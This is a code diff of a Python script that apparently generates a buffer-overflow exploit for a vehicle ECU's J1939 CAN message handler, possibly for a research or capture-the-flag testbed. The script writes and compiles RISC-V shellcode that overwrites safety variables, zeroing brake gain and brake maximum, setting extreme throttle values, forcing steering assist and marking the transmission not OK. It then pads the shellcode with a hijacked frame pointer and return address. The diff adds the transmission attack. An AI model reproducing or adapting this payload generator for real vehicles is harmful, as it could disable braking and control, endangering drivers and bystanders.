@@ -48,65 +48,70 @@ import argparse
 #   ra at 0xc0140728, fp at 0xc0140720, pc at 0xc0140728
 # (gdb) x $ra
 # 0xc00088ce <prvCanRxTask+362>:  0x07a387aa <<< This is the return address
-RETURN_ADDR = 0xc00088ce
+RETURN_ADDR = 0xc00088f2
 
 # (gdb) p camera_ok
 # (gdb) false
 CAMERA_OK_VAL = 1
 # (gdb) p &camera_ok
-# (gdb) (_Bool *) 0xc08902b6 <camera_ok>
-CAMERA_OK_ADDR = 0xc08902b6
+# (gdb) (_Bool *) 0xc0890352 <camera_ok>
+CAMERA_OK_ADDR = 0xc0890352
 
 # (gdb) p steering_assist
 # (gdb) 0 '\000'
-STEERING_ASSIST_VAL = 1
+STEERING_ASSIST_VAL = 100
 # (gdb) p &steering_assist
-# (gdb) (uint8_t *) 0xc08902c2 <steering_assist> ""
-STEERING_ASSIST_ADDR = 0xc08902c2
+# (gdb) (uint8_t *) 0xc0890362 <steering_assist> ""
+STEERING_ASSIST_ADDR = 0xc0890362
 
 # (gdb) p throttle_min
 # $10 = 64
 THROTTLE_MIN_VAL = -900
 # (gdb) p &throttle_min
-# $11 = (int16_t *) 0xc08902c4 <throttle_min>
-THROTTLE_MIN_ADDR = 0xc08902c4
+# $11 = (int16_t *) 0xc0890364 <throttle_min>
+THROTTLE_MIN_ADDR = 0xc0890364
 
 # (gdb) p throttle_gain
 # $12 = 100
 THROTTLE_GAIN_VAL = 3000
 # (gdb) p &throttle_gain
-# $13 = (int16_t *) 0xc08902b2 <throttle_gain>
-THROTTLE_GAIN_ADDR = 0xc08902b2
+# $13 = (int16_t *) 0xc089034e <throttle_gain>
+THROTTLE_GAIN_ADDR = 0xc089034e
 
 # (gdb) p brake_max
 # $14 = 510
 BRAKE_MAX_VAL = 0
 # (gdb) p &brake_max
-# $15 = (int16_t *) 0xc08902a4 <brake_max>
-BRAKE_MAX_ADDR = 0xc08902a4
+# $15 = (int16_t *) 0xc0890340 <brake_max>
+BRAKE_MAX_ADDR = 0xc0890340
 
 # (gdb) p brake_gain
 # $17 = 100
 BRAKE_GAIN_VAL = 0
 # (gdb) p &brake_gain
-# $18 = (int16_t *) 0xc08902cc <brake_gain>
-BRAKE_GAIN_ADDR = 0xc08902cc
+# $18 = (int16_t *) 0xc0890370 <brake_gain>
+BRAKE_GAIN_ADDR = 0xc0890370
+
+# (gdb) p &transmission_ok
+# (gdb) (_Bool *) 0xc0890366 <transmission_ok>
+TRANSMISSION_OK_ADDR = 0xc0890366
+# Set to 0 to make transmission not OK
+TRANSMISSION_OK_VAL = 0
 
 # (gdb) p &j1939_rx_buf
-# (gdb) (uint8_t (*)[100]) 0xc0890240 <j1939_rx_buf>
+# (gdb) (uint8_t (*)[256]) 0xc0890240 <j1939_rx_buf>
 # We are jumping to this address
 J1939_RX_BUF_ADDR = 0xc0890240
 # (gdb) p $fp
 # (gdb) (void *) 0xc01407c0 <ucHeap+766392>
 # This should FP of prvCanRxTask because we are jumping back there
 FRAME_ADDR = 0xc01407c0
- 
 
-# Buffer size is 64
-RX_BUFFER_SIZE = 64
-FRAME_IDX = 8
+# Buffer size of char msg[];
+RX_BUFFER_SIZE = 100
+FRAME_IDX = 4
 ADDR_IDX = 16
-OVERFLOW_PACKET_FRAME_IDX = RX_BUFFER_SIZE + FRAME_IDX 
+OVERFLOW_PACKET_FRAME_IDX = RX_BUFFER_SIZE + FRAME_IDX
 OVERFLOW_PACKET_ADDR_IDX = RX_BUFFER_SIZE + ADDR_IDX
 OVERFLOW_PACKET_SIZE = RX_BUFFER_SIZE + FRAME_IDX + ADDR_IDX
 PAYLOAD_SIZE = OVERFLOW_PACKET_SIZE
@@ -132,7 +137,7 @@ def hack_generate_payload(hacktype):
     if hacktype == THROTTLE_HACK:
         print(THROTTLE_HACK)
         # Set throttle_min to -900
-        # Set throttle_gain to int16_max (32767) 
+        # Set throttle_gain to int16_max (32767)
         payload = [
                     "li t3, {}\n".format(hex(THROTTLE_MIN_ADDR)), # load location of the variable
                     "li t4, {}\n".format(hex(THROTTLE_MIN_VAL)), # load new value
@@ -155,7 +160,15 @@ def hack_generate_payload(hacktype):
                 ]
     elif hacktype == GEAR_HACK:
         print(GEAR_HACK)
-        # This one might be more difficult
+        # Replace all assignments in switch statement for tmp_gear
+        # to be 'N'
+        payload = [
+                    "li t3, {}\n".format(hex(TRANSMISSION_OK_ADDR)), # load location of the variable
+                    "li t4, {}\n".format(hex(TRANSMISSION_OK_VAL)), # load new value
+                    "sb t4, 0(t3)\n", # store new value
+                    "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
+                    "ret\n", # initiate jump
+                ]
     elif hacktype == LKAS_HACK:
         print(LKAS_HACK)
         # Set camera_ok =1
@@ -174,8 +187,8 @@ def hack_generate_payload(hacktype):
         print(f"Unknown hack type: {hacktype}")
         raise NotImplementedError
     print(">>> Generating malicious payload source file.")
-    with open("ecu.asm", "w") as f: 
-        # Writing data to a file 
+    with open("ecu.asm", "w") as f:
+        # Writing data to a file
         f.writelines(payload)
     # Compile
     print(">>> Building malicious payload.")
@@ -185,7 +198,7 @@ def hack_generate_payload(hacktype):
     os.system(cmd)
     # read data from temporary payload file
     print(">>> Reading data from temporary payload file")
-    with open("ecu.bin", "r+b") as f: 
+    with open("ecu.bin", "r+b") as f:
         payload_bytes = f.read()
     print(f">>> Compiled payload has {len(payload_bytes)} bytes")
     fp_bytes = FRAME_ADDR.to_bytes(POINTER_SIZE, byteorder='little')
@@ -193,12 +206,12 @@ def hack_generate_payload(hacktype):
     print(f">>> $fp and $ra are {len(fp_bytes) + len(ra_bytes)} long")
     print(f">>> Padding with {PAYLOAD_SIZE - len(payload_bytes) - len(fp_bytes) - len(ra_bytes)} bytes")
     # Add padding depending on the length of the instructions
-    payload = payload_bytes + bytes(PAYLOAD_SIZE - len(payload_bytes) - 
+    payload = payload_bytes + bytes(PAYLOAD_SIZE - len(payload_bytes) -
                 len(fp_bytes) - len(ra_bytes)) + \
                 fp_bytes + ra_bytes
     print(f">>> Padded payload is {len(payload)} bytes long")
     return "{" + ''.join([hex(c) + "," for c in  payload]) + "}"
-    
+
 
 def hack_generate_header(ip, port, hacktype):
     """
@@ -216,8 +229,8 @@ def hack_generate_header(ip, port, hacktype):
         f"#define J1939_PAYLOAD {payload}\n",
         ]
 
-    with open(j1939_header_path, "w") as f: 
-        # Writing data to a file 
+    with open(j1939_header_path, "w") as f:
+        # Writing data to a file
         f.writelines(content)
 
 def hack_compile(test=False):
@@ -237,10 +250,10 @@ def main():
     parser.add_argument('--type', help='Type of hack', choices=HACKS,default=THROTTLE_HACK)
     parser.add_argument('--test', help='test mode (no exploit)', action='store_true')
     args = parser.parse_args()
-    
+
     hack_generate_header(ip=args.ip, port=args.port, hacktype=args.type)
     hack_compile(test=args.test)
-    
+
     if args.test:
         print("Test mode: Nothing else to be done")
     else:
